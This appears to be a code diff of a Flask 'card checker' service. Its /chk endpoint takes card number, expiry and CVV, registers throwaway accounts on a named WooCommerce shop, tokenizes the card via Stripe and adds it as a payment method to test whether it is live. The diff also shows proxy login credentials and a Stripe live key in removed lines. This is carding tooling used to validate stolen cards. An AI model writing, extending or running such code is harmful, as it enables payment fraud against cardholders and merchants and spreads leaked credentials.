@@ -1,9 +1,5 @@
 from flask import Flask, request, jsonify
-import requests, re, random, string, sys, threading, time
 app = Flask(__name__)
-P_URL = "http://purevpn0s4863210:cq4naylqyfc1@px210404.pointtoserver.com:10780" 
-S_PK = 'pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs'
-S_ACC = 'acct_1Mpulb2El1QixccJ'
 class Gate:
     def __init__(self):
         self.s = requests.Session()
@@ -21,8 +17,8 @@ class Gate:
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
-            'sec-ch-ua': '\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"',
-            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua': '\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"', 
+            'sec-ch-ua-mobile': '?0', 
             'sec-ch-ua-platform': '\"Windows\"'
         })
     
@@ -31,7 +27,7 @@ class Gate:
     def reg(self):
         try:
             r1 = self.s.get('https://redbluechair.com/my-account/')
-            n = re.search(r'name=\"woocommerce-register-nonce\" value=\"([^\"]+)\"', r1.text).group(1)
+            n = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', r1.text).group(1)
             rnd = self.rnd_str()
             dt = {
                 'email': f'user{rnd}@gmail.com',
@@ -48,7 +44,7 @@ class Gate:
         try:
             h = {
                 'authority': 'api.stripe.com',
-                'accept': 'application/json',
+                'accept': 'application/json', 
                 'content-type': 'application/x-www-form-urlencoded',
                 'origin': 'https://js.stripe.com',
                 'referer': 'https://js.stripe.com/',
@@ -65,7 +61,7 @@ class Gate:
                 'payment_user_agent': 'stripe.js/cba9216f35; stripe-js-v3/cba9216f35; payment-element; deferred-intent',
                 'referrer': 'https://redbluechair.com',
                 'guid': '8c58666c-8edd-46ee-a9ce-0390cd63f8028e5c25',
-                'muid': 'ea2ab4e5-2059-438e-b27d-3bd4d6a94ae29d8630',
+                'muid': 'ea2ab4e5-2059-438e-b27d-3bd4d6a94ae29d8630', 
                 'sid': '53c09a94-1512-4db1-b3c0-f011656359e1281fed'
             }
             r = requests.post('https://api.stripe.com/v1/payment_methods', headers=h, data=d)
@@ -77,13 +73,15 @@ class Gate:
             r1 = self.s.get('https://redbluechair.com/my-account/add-payment-method/')
             txt = r1.text
             n = None
-            m1 = re.search(r'\"createSetupIntentNonce\":\"([^\"]+)\"', txt)
+            
+            m1 = re.search(r'"createSetupIntentNonce":"([^"]+)"', txt)
             if m1: n = m1.group(1)
+            
             if not n:
-                m2 = re.search(r'\"createAndConfirmSetupIntentNonce\":\"([^\"]+)\"', txt)
+                m2 = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', txt)
                 if m2: n = m2.group(1)
             if not n:
-                m3 = re.search(r'\"create_setup_intent_nonce\":\"([a-z0-9]+)\"', txt)
+                m3 = re.search(r'"create_setup_intent_nonce":"([a-z0-9]+)"', txt)
                 if m3: n = m3.group(1)
             
             if not n: return "Error"
@@ -95,6 +93,7 @@ class Gate:
                 'wcpay-payment-method': (None, pm),
                 '_ajax_nonce': (None, n)
             }
+            
             r2 = self.s.post('https://redbluechair.com/wp-admin/admin-ajax.php', headers=h, files=pl)
             js = r2.json()
             
@@ -107,21 +106,27 @@ class Gate:
             return "Error"
 @app.route('/chk', methods=['GET'])
 def check_card():
-    card_details = request.args.get('card')  # Get 'card' parameter
+    card = request.args.get('card')
     
-    if not card_details:
+    if not card: 
         return jsonify({"error": "No card provided"}), 400
-        
-    sp = [s.strip() for s in card_details.split('|')]
     
-    if len(sp) != 4 or any(s == "" for s in sp):
-        return jsonify({"error": "Invalid format"}), 400
+    sp = card.strip().split('|')
+    if len(sp) < 4:
+        return jsonify({"error": "Format Error"}), 400
     
     cc, mm, yy, cvv = sp[0], sp[1], sp[2], sp[3]
     
-    # Here you would add your validation logic
-    result = f"Validated {cc} expiring {mm}/{yy}"
+    api = Gate()
+    if api.reg():
+        tok = api.tok(cc, mm, yy, cvv)
+        if tok:
+            res = api.add(tok)
+        else:
+            res = "Error"
+    else:
+        res = "Error"
     
-    return jsonify({"result": result}), 200
+    return jsonify({"result": res})
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    app.run(host='0.0.0.0', port=5000, ssl_context=('path/to/cert.pem', 'path/to/key.pem'))
